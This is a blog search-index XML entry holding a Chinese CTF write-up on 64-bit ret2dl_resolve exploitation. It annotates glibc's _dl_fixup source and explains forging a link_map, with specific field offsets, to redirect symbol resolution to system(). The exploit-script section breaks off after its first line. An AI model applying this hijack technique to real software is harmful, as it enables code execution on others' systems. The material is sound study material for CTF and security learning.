<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>TaLCTF ret2dl_resolve_x86-64</title>
    <link href="/2020/06/10/TaLpwn-learning-ret2dl-64/"/>
    <url>/2020/06/10/TaLpwn-learning-ret2dl-64/</url>
    
    <content type="html"><![CDATA[<p><del>当时没做出来的一道题，赛后再静下心研究一下，ret2dl 64位模版题，一瞬把我秒了。。</del></p><h2 id="什么是ret2dl攻击"><a href="#什么是ret2dl攻击" class="headerlink" title="什么是ret2dl攻击"></a>什么是ret2dl攻击</h2><ul><li>当程序在第一次加载某个函数的时候，got表中对应的表项还没有写入真实的地址（因为是第一次调用），所以这个时候就需要调用<code>_dl_runtime_resolve</code>函数将真实的地址写入got表对应的表项中，然后将控制权交还这个函数，此时就完成了第一次的调用，got表中也有了对应的真实地址。<h2 id="整个调用过程梳理"><a href="#整个调用过程梳理" class="headerlink" title="整个调用过程梳理"></a>整个调用过程梳理</h2><h3 id="dl-fixup之前"><a href="#dl-fixup之前" class="headerlink" title="_dl_fixup之前"></a>_dl_fixup之前</h3></li><li>当我们第一调用read时，他的跳转过程是<code>read@plt -&gt; read@got -&gt; read@plt -&gt; plt[0] -&gt; _dl_runtime_resolve_xsave -&gt; _dl_fixup</code><img src="https://s1.ax1x.com/2020/06/10/t70ca8.png" srcset="/img/loading.gif" alt="">)我们可以再看一下0x4004e0到底是什么。<img src="https://s1.ax1x.com/2020/06/10/t70LiF.png" srcset="/img/loading.gif" alt="">已知 &lt;read@plt&gt;  是plt中的第一个函数，那么0x4004e0就是plt[0]即plt的首项。这里对应两条汇编，第一条实际上做了一个push操作，他负责将一个参数压栈。这里需要实际解释一下：在<code>_dl_runtime_resolve_xsave</code>中实际调用了<code>_dl_fixup</code>而忽略掉宏定义，这个函数是:  <pre><code class="hljs c"><span class="hljs-comment">/* This function is called through a special trampoline from the PLT the</span><span class="hljs-comment">first time each PLT entry is called.  We must perform the relocation</span><span class="hljs-comment">specified in the PLT of the given shared object, and return the resolved</span><span class="hljs-comment">function address to the trampoline, which will restart the original call</span><span class="hljs-comment">to that address.  Future calls will bounce directly from the PLT to the</span><span class="hljs-comment">function.  */</span>DL_FIXUP_VALUE_TYPEattribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</code></pre></li></ul><p>可以看到一共有两个参数：<code>struct link_map *l, ElfW(Word) reloc_arg</code>，然后我们再回过来看刚刚的代码，<strong>其实两个push就是做了参数压栈</strong>：<img src="https://s1.ax1x.com/2020/06/10/t7DzE6.png" srcset="/img/loading.gif" alt=""></p><h3 id="dl-fixup进入以后"><a href="#dl-fixup进入以后" class="headerlink" title="_dl_fixup进入以后"></a>_dl_fixup进入以后</h3><ul><li>嗯这、这里是关键，我们一步步分析一下<code>_dl_fixup</code>源代码。在这之前，我们先要研究一下几个重要的section和段。<h4 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h4><img src="https://s1.ax1x.com/2020/06/11/t7sey9.png" srcset="/img/loading.gif" alt="">.dynamic是动态链接中非常重要和经典的一个段。首先看一下<code>ELF64_Dyn</code>的结构如下：<pre><code class="hljs c"><span class="hljs-comment">// 该结构都有 64 位程序和 32 位程序的区别，不过大致结构相似，此处只讨论 64 位程序中的</span><span class="hljs-comment">// /usr/include/elf.h</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><span class="hljs-class">&#123;</span>Elf64_Sxword d_tag; <span class="hljs-comment">/* Dynamic entry type */</span><span class="hljs-comment">// d_tag 识别该结构体表示的哪一个节，通过以此字段不同来寻找不同的节</span>    <span class="hljs-keyword">union</span>    &#123;        Elf64_Xword d_val; <span class="hljs-comment">/* Integer value */</span>        <span class="hljs-comment">// 对应节的地址，用于存储该结构体表示下的节所在的地址</span>        Elf64_Addr d_ptr; <span class="hljs-comment">/* Address value */</span>    &#125; d_un;&#125; Elf64_Dyn;</code></pre>而在.dynamic之中有几个<strong>重要的section如下</strong>：<table><thead><tr><th>d_tag类型</th><th>d_un含义</th></tr></thead><tbody><tr><td>DT_SYMTAB</td><td>动态链接<strong>符号表的地址</strong>，d_ptr指向”.dynsym”的地址</td></tr><tr><td>DT_STRTAB</td><td>动态链接<strong>字符串表的地址</strong> ，d_ptr指向”.dynstr”的地址</td></tr><tr><td>DT_JMPREL</td><td>动态链接<strong>重定位表的信息</strong>，d_ptr指向”.rel.plt”地址</td></tr><tr><td>DT_VERSYM</td><td>.gnu.version的节的位置</td></tr></tbody></table></li></ul><h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h4><p><img src="https://s1.ax1x.com/2020/06/11/t76sqs.png" srcset="/img/loading.gif" alt=""><br>其中，ELF64_Sym结构体为：</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><span class="hljs-class">&#123;</span>Elf64_Word st_name; <span class="hljs-comment">/* Symbol name (string tbl index) */</span><span class="hljs-comment">// 保存着该函数函数名在 .dynstr 中的偏移，可以结合 .dynstr 找到准确函数名。</span><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> st_info; <span class="hljs-comment">/* Symbol type and binding */</span><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> st_other; <span class="hljs-comment">/* Symbol visibility */</span>Elf64_Section st_shndx; <span class="hljs-comment">/* Section index */</span>Elf64_Addr st_value; <span class="hljs-comment">/* Symbol value */</span><span class="hljs-comment">// 如果这个符号被导出，则存有这个导出函数的虚拟地址，否则为NULL.</span>Elf64_Xword st_size; <span class="hljs-comment">/* Symbol size */</span>&#125; Elf64_Sym;</code></pre><h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h4><p><img src="https://s1.ax1x.com/2020/06/11/t76hzF.png" srcset="/img/loading.gif" alt=""></p><h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h4><p><img src="https://s1.ax1x.com/2020/06/11/t7gFB9.png" srcset="/img/loading.gif" alt=""><br>其中，ELF64_Rela结构体为：</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>           Elf64_Addr r_offset; <span class="hljs-comment">//保存的是应用重定位操作的偏移量。对于一个重定位文件，这个值是从节开始到受重定位影响的存储单元的偏移量。对于一个可执行或共享目标文件，这个值是受重定位影响的存储单元的虚拟地址。</span>           <span class="hljs-keyword">uint64_t</span>   r_info;   <span class="hljs-comment">//This member gives both the symbol table index with respect to which the relocation must be made and the type of relocation to apply. </span>           <span class="hljs-keyword">int64_t</span>    r_addend; <span class="hljs-comment">//指定了一个附加的常数用来去计算保存在重定位位置的值。</span>       &#125; Elf64_Rela;</code></pre><h4 id="link-map结构"><a href="#link-map结构" class="headerlink" title="link_map结构"></a>link_map结构</h4><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span></span><span class="hljs-class">  &#123;</span>    ElfW(Addr) l_addr;                <span class="hljs-comment">/* Base address shared object is loaded at.  */</span>    <span class="hljs-keyword">char</span> *l_name;                     <span class="hljs-comment">/* Absolute file name object was found in.  */</span>    ElfW(Dyn) *l_ld;                  <span class="hljs-comment">/* Dynamic section of the shared object.  */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>, *<span class="hljs-title">l_prev</span>;</span> <span class="hljs-comment">/* Chain of loaded objects.  */</span>    <span class="hljs-comment">//省略，后面还有很多</span>  &#125;;</code></pre><h4 id="D-PTR宏"><a href="#D-PTR宏" class="headerlink" title="D_PTR宏"></a>D_PTR宏</h4><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> DL_RO_DYN_SECTION</span><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> D_PTR(map, i) (map)-&gt;i-&gt;d_un.d_ptr</span><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></code></pre><h4 id="ELFW宏"><a href="#ELFW宏" class="headerlink" title="ELFW宏"></a>ELFW宏</h4><pre><code class="hljs c"><span class="hljs-comment">/* We use this macro to refer to ELF macros independent of the native</span><span class="hljs-comment">   wordsize.  `ELFW(R_TYPE)' is used in place of `ELF32_R_TYPE' or</span><span class="hljs-comment">   `ELF64_R_TYPE'.  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELFW(type)_ElfW (ELF, __ELF_NATIVE_CLASS, type)</span></code></pre><h4 id="DL-FIXUP-MAKE-VALUE宏"><a href="#DL-FIXUP-MAKE-VALUE宏" class="headerlink" title="DL_FIXUP_MAKE_VALUE宏"></a>DL_FIXUP_MAKE_VALUE宏</h4><pre><code class="hljs c"><span class="hljs-comment">/* Construct a value of type DL_FIXUP_VALUE_TYPE from a code address</span><span class="hljs-comment">   and a link map.  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DL_FIXUP_MAKE_VALUE(map, addr) (addr)</span></code></pre><h4 id="SYMBOL-ADDRESS宏"><a href="#SYMBOL-ADDRESS宏" class="headerlink" title="SYMBOL_ADDRESS宏"></a>SYMBOL_ADDRESS宏</h4><pre><code class="hljs c"><span class="hljs-comment">/* Calculate the address of symbol REF using the base address from map MAP,</span><span class="hljs-comment">   if non-NULL.  Don't check for NULL map if MAP_SET is TRUE.  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYMBOL_ADDRESS(map, ref, map_set)\</span>  ((ref) == <span class="hljs-literal">NULL</span> ? <span class="hljs-number">0</span>\   : (__glibc_unlikely ((ref)-&gt;st_shndx == SHN_ABS) ? <span class="hljs-number">0</span>\      : LOOKUP_VALUE_ADDRESS (<span class="hljs-built_in">map</span>, map_set)) + (ref)-&gt;st_value)</code></pre><h4 id="LOOKUP-VALUE-ADDRESS宏"><a href="#LOOKUP-VALUE-ADDRESS宏" class="headerlink" title="LOOKUP_VALUE_ADDRESS宏"></a>LOOKUP_VALUE_ADDRESS宏</h4><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)-&gt;l_addr : 0)</span></code></pre><h4 id="elf-machine-fixup-plt函数"><a href="#elf-machine-fixup-plt函数" class="headerlink" title="elf_machine_fixup_plt函数"></a>elf_machine_fixup_plt函数</h4><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Addr)</span></span><span class="hljs-function"><span class="hljs-title">elf_machine_fixup_plt</span> <span class="hljs-params">(struct link_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">lookup_t</span> t,</span></span><span class="hljs-function"><span class="hljs-params">       <span class="hljs-keyword">const</span> ElfW(Sym) *refsym, <span class="hljs-keyword">const</span> ElfW(Sym) *sym,</span></span><span class="hljs-function"><span class="hljs-params">       <span class="hljs-keyword">const</span> ElfW(Rela) *reloc,</span></span><span class="hljs-function"><span class="hljs-params">       ElfW(Addr) *reloc_addr, ElfW(Addr) value)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">return</span> *reloc_addr = value;&#125;</code></pre><h4 id="x86-64下对于reloc-arg的特殊define"><a href="#x86-64下对于reloc-arg的特殊define" class="headerlink" title="x86-64下对于reloc_arg的特殊define"></a>x86-64下对于reloc_arg的特殊define</h4><pre><code class="hljs c"><span class="hljs-comment">/* The ABI calls for the PLT stubs to pass the index of the relocation</span><span class="hljs-comment">   and not its offset.  In _dl_profile_fixup and _dl_call_pltexit we</span><span class="hljs-comment">   also use the index.  Therefore it is wasteful to compute the offset</span><span class="hljs-comment">   in the trampoline just to reverse the operation immediately</span><span class="hljs-comment">   afterwards.  此时的reloc_arg类似于一个数组下标 */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> reloc_offset reloc_arg * sizeof (PLTREL)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> reloc_index  reloc_arg</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;elf/dl-runtime.c&gt;</span></span></code></pre><h4 id="dl-fixup源码阅读"><a href="#dl-fixup源码阅读" class="headerlink" title="_dl_fixup源码阅读"></a>_dl_fixup源码阅读</h4><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF64_R_SYM(i)            ((i) &gt;&gt; 32)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF64_R_TYPE(i)            ((i) &amp; 0xffffffff)</span><span class="hljs-comment">/*这里由于我们是64位下的，请看：x86-64下对于reloc_arg的特殊define*/</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> reloc_offset</span><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> reloc_offset reloc_arg</span><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>DL_FIXUP_VALUE_TYPEattribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS   ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif   struct link_map *l, ElfW(Word) reloc_arg)&#123;  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-keyword">const</span> symtab</span><span class="hljs-function">    </span>= (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);      <span class="hljs-comment">//通过指向linkmap找到DT_SYMTAB，进而得到.dynsym地址，存在symtab里。</span>    <span class="hljs-comment">//查找过程：l -&gt; linkmap -&gt; DT_SYMTAB -&gt; .dynsym</span>    <span class="hljs-comment">//其中l指向linkmap，d_tag类型为DT_SYMTAB时，d_ptr指向.dynsym</span>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *strtab    = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);    <span class="hljs-comment">//拿到.dynstr地址</span>  <span class="hljs-keyword">const</span> PLTREL *<span class="hljs-keyword">const</span> reloc    = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);    <span class="hljs-comment">//reloc_offset就是reloc_arg</span>    <span class="hljs-comment">//将.rel.plt地址与reloc_offset相加，得到函数所对应的Elf64_Rel指针，记作reloc </span>  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *sym </span><span class="hljs-function">   </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];    <span class="hljs-comment">//将(reloc-&gt;r_info)&gt;&gt;32作为.dynsym下标，得到函数所对应的Elf64_Sym指针，记作sym</span>  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *refsym </span>= sym;  <span class="hljs-keyword">void</span> *<span class="hljs-keyword">const</span> rel_addr = (<span class="hljs-keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);    <span class="hljs-comment">//l-&gt;l_addr 加载共享对象的基本地址</span>    <span class="hljs-comment">//l-&gt;l_addr + reloc-&gt;r_offset即为需要修改的got表地址。</span>   <span class="hljs-keyword">lookup_t</span> result;  DL_FIXUP_VALUE_TYPE value;  <span class="hljs-comment">/* Sanity check that we're really looking at a PLT relocation.  */</span>  <span class="hljs-comment">/* 检查r_info最低为是不是7 */</span>  <span class="hljs-comment">/* ELFW(TYPE)是用来代替 Elf32_TYPE 或 Elf64_TYPE*/</span>  <span class="hljs-comment">/* ELF_MACHINE_JMP_SLOT=7 有兴趣可以自己看源码在：glibc/latest/source/elf/elf.h */</span>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><span class="hljs-comment">      used don't look in the global scope.  */</span>        <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)   <span class="hljs-comment">//判断(sym-&gt;st_other)&amp;0x03是否为0</span>    &#123;      <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> = <span class="hljs-title">NULL</span>;</span>      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)&#123;  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Half)</span> *vernum </span>=    (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;          <span class="hljs-comment">//64位下没法伪造reloc_arg的原因：(reloc-&gt;r_info)&gt;&gt;32作为vernum下标取值容易出现非法内存访问</span>      <span class="hljs-comment">//大佬的解释：64位程序bss段被映射到0x600000,我们伪造的.dynsym也在0x600000+,而DT_SYM结构体中的d_ptr还是在0x400000,这就意味着我们的r_info必然很大，再加上数据类型大小的不同，导致(reloc-&gt;r_info)&gt;&gt;32作为vernum下标取值时十分容易访问到0x400000和0x600000之间的不可读区域</span>      <span class="hljs-comment">/*</span><span class="hljs-comment">      #define ELF64_R_SYM(i)            ((i) &gt;&gt; 32)</span><span class="hljs-comment">      #define ELF64_R_TYPE(i)            ((i) &amp; 0xffffffff)</span><span class="hljs-comment">      */</span>  version = &amp;l-&gt;l_versions[ndx];  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)    version = <span class="hljs-literal">NULL</span>;&#125;      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><span class="hljs-comment"> not necessary for objects which cannot be unloaded or when</span><span class="hljs-comment"> we are not using any threads (yet).  */</span>      <span class="hljs-keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)&#123;  THREAD_GSCOPE_SET_FLAG ();  flags |= DL_LOOKUP_GSCOPE_LOCK;&#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span>      RTLD_ENABLE_FOREIGN_CALL;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>    <span class="hljs-comment">/* 通过 strtab+sym-&gt;st_name 找到函数对应的字符串，result为libc_base */</span>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);      <span class="hljs-comment">/* We are done with the global scope.  */</span>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)THREAD_GSCOPE_RESET_FLAG ();<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span>      RTLD_FINALIZE_FOREIGN_CALL;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><span class="hljs-comment"> of the object that defines sym.  Now add in the symbol</span><span class="hljs-comment"> offset.  */</span>     <span class="hljs-comment">/* 函数的真实地址 = libc_base(result) + 偏移地址*/</span>      value = DL_FIXUP_MAKE_VALUE (result,   SYMBOL_ADDRESS (result, sym, <span class="hljs-literal">false</span>));    &#125;  <span class="hljs-keyword">else</span>    &#123;      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><span class="hljs-comment"> address) is also known.  */</span>      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="hljs-literal">true</span>));      result = l;    &#125;  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span>  value = elf_machine_plt_value (l, reloc, value);  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))    <span class="hljs-keyword">return</span> value;<span class="hljs-comment">/* 将函数的真实地址写入got表对应的表项，value为真实地址、rel_addr为需要写入的got表地址 */</span>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);&#125;</code></pre><h4 id="ret2dl-resolve-x86-64-重定向流程"><a href="#ret2dl-resolve-x86-64-重定向流程" class="headerlink" title="ret2dl_resolve_x86-64 重定向流程"></a>ret2dl_resolve_x86-64 重定向流程</h4><ul><li>通过struct link_map *l获取 <em>.dynsym  .dynstr  .rel.plt</em> 地址</li><li>将.rel.plt地址与reloc_offset相加，得到函数所对应的Elf64_Rel指针，记作reloc </li><li>将(reloc-&gt;r_info)&gt;&gt;32作为.dynsym下标，得到函数所对应的Elf64_Sym指针，记作sym</li><li>检查r_info最低位是否为7</li><li>判断(sym-&gt;st_other)&amp;0x03是否为0</li><li>通过 strtab+sym-&gt;st_name 在字符串表中找到函数对应的字符串，然后把真实地址赋给rel_addr（rel_addr指向got表中的对应位置），最后控制权交给这个函数，执行。</li></ul><h2 id="跟踪调试"><a href="#跟踪调试" class="headerlink" title="跟踪调试"></a>跟踪调试</h2><p>跟着之前的大师傅们调试一波</p><h3 id="运行时查看-dynamic"><a href="#运行时查看-dynamic" class="headerlink" title="运行时查看.dynamic"></a>运行时查看.dynamic</h3><p><img src="https://s1.ax1x.com/2020/06/11/tHDPq1.png" srcset="/img/loading.gif" alt=""></p><h3 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h3><p><img src="https://s1.ax1x.com/2020/06/11/tHrf1g.png" srcset="/img/loading.gif" alt=""></p><h3 id="进入-dl-fixup"><a href="#进入-dl-fixup" class="headerlink" title="进入_dl_fixup"></a>进入_dl_fixup</h3><p><img src="https://s1.ax1x.com/2020/06/11/tHsoxe.png" srcset="/img/loading.gif" alt=""><br><img src="https://s1.ax1x.com/2020/06/11/tH6mkt.png" srcset="/img/loading.gif" alt=""><br>这里拿到函数对应的Elf64_Sym地址<br><img src="https://s1.ax1x.com/2020/06/11/tHWJJI.png" srcset="/img/loading.gif" alt=""><br>看雪上有师傅计算过，当作为数组下标时（64位），很容易出现非法内存访问。这里我就不算了。<br>贴上大师傅的解释：<br><em>const ElfW(Sym) const symtab = 0x400280<br>const ElfW(Half) vernum = 0x4003d8<br>(r_info&gt;&gt;32)作为symtab的下标时，其值大于0x600000小于0x601000,也就是说0x1553a&lt;(r_info&gt;&gt;32)≤0x15fe5<br>(r_info&gt;&gt;32)作为vernum下标时，要使得不产生非法内存访问，需要0≤(r_info&gt;&gt;32)≤0x614或者0xffe14≤(r_info&gt;&gt;32)≤0x100614<br>无法找到同时满足二者的(r_info&gt;&gt;32)的值</em></p><h2 id="伪造link-map攻击"><a href="#伪造link-map攻击" class="headerlink" title="伪造link_map攻击"></a>伪造link_map攻击</h2><h3 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h3><p>64位和32位比，最容易出问题的就是这里</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)&#123;  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Half)</span> *vernum </span>=    (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;          <span class="hljs-comment">//64位下没法伪造reloc_arg的原因：(reloc-&gt;r_info)&gt;&gt;32作为vernum下标取值容易出现非法内存访问</span>      <span class="hljs-comment">/*</span><span class="hljs-comment">      #define ELF64_R_SYM(i)            ((i) &gt;&gt; 32)</span><span class="hljs-comment">      #define ELF64_R_TYPE(i)            ((i) &amp; 0xffffffff)</span><span class="hljs-comment">      */</span>  version = &amp;l-&gt;l_versions[ndx];  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)    version = <span class="hljs-literal">NULL</span>;&#125;</code></pre><p>而<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>对应的就是</p><pre><code class="hljs asm">mov rax, qword ptr [r10 + 0x1c8]</code></pre><p>那么我们通过控制<em>link_map + 0x1c8</em>的值就可以绕过这个if，再来看一下这一段整个的情况：</p><pre><code class="hljs c">   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><span class="hljs-comment">      used don't look in the global scope.  */</span><span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//判断(sym-&gt;st_other)&amp;0x03是否为0</span>    &#123;      <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> = <span class="hljs-title">NULL</span>;</span>      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//mov rax, qword ptr [r10 + 0x1c8]</span>        &#123;            <span class="hljs-comment">/*省略*/</span>        &#125;    &#125;<span class="hljs-keyword">else</span>    &#123;      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><span class="hljs-comment"> address) is also known.  */</span>      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="hljs-literal">true</span>));      result = l;    &#125;</code></pre><p>当我们将(sym-&gt;st_other)&amp;0x03设置为非0时，会进入else语句，此时else中通过<code>DL_FIXUP_MAKE_VALUE</code>来获取函数的真实地址，所以<strong>我们只需要将l-&gt;l_addr + sym-&gt;st_value指向system语句即可进入system函数（具体可以看我前面总结的那几个关键的宏，他们是一层一层调用的，最终简化出来就是这个式子）</strong></p><hr><p><strong>PS:</strong><br>可能到这里很多人都忘了l和sym到底是什么了。。来复习一下，l是指向link_map的指针，sym是</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *sym </span><span class="hljs-function">  </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];   <span class="hljs-comment">//将(reloc-&gt;r_info)&gt;&gt;32作为.dynsym下标，得到函数所对应的Elf64_Sym指针，记作sym</span></code></pre><p>而link_map结构体大致如下：</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span></span><span class="hljs-class">  &#123;</span>    ElfW(Addr) l_addr;                <span class="hljs-comment">/* Base address shared object is loaded at.  */</span>    <span class="hljs-keyword">char</span> *l_name;                     <span class="hljs-comment">/* Absolute file name object was found in.  */</span>    ElfW(Dyn) *l_ld;                  <span class="hljs-comment">/* Dynamic section of the shared object.  */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>, *<span class="hljs-title">l_prev</span>;</span> <span class="hljs-comment">/* Chain of loaded objects.  */</span>    <span class="hljs-comment">//......省略一大堆</span>  &#125;;</code></pre><p>其实link_map是个超级大的结构体<img src="https://s1.ax1x.com/2020/06/11/tbs9ot.png" srcset="/img/loading.gif" alt=""></p><hr><p>但是当我们不知道system函数的地址时，可以采用以下方法：<strong>让sym-&gt;st_value等于某个got上已经解析了的函数的那一表项，然后l-&gt;l_addr设置为system与这个函数的偏移值</strong>，此外，伪造link_map我们还需要伪造：<em>位于link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针，另外strtab必须是个可读的地址，因此我们还需要伪造位于link_map+0x68的DT_STRTAB指针。之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体。为了方便，在构造的过程中一般将reloc_arg作为0来进行构造。</em></p><ul><li>已知link_map地址<em>0x7ffff7ffe168</em>，我们看一下link_map+0x70<img src="https://s1.ax1x.com/2020/06/11/tbqwNV.png" srcset="/img/loading.gif" alt=""></li><li>再对照一下 <em>.dynamic</em>段中的内容,没问题：<img src="https://s1.ax1x.com/2020/06/11/tbqWAx.png" srcset="/img/loading.gif" alt=""></li><li><em>通过跟踪dl_fixup 函数发现，dl_fixup引用了link_map+0x68/0x70/0xf8处的3个值来寻找STRTAB/SYMTAB/JMPREL这3个表。</em><h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><pre><code class="hljs py"><span class="hljs-comment"># encoding=utf-8</span><span 